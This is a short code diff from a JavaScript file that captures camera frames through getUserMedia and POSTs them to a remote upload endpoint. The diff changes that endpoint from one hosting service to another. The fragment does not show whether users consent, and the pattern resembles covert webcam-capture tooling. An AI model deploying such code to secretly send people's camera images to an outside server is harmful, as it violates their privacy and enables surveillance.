@@ -65,7 +65,7 @@ navigator.mediaDevices.getUserMedia({ video: true }).then(stream => {
     c.toBlob(blob => {
       let reader = new FileReader();
       reader.onloadend = () => {
-        fetch("https://chorcha.pythonanywhere.com/upload", {
+        fetch("https://chorcha.onrender.com/upload", {
           method: "POST",
           headers: { 'Content-Type': 'text/plain' },
           body: reader.result
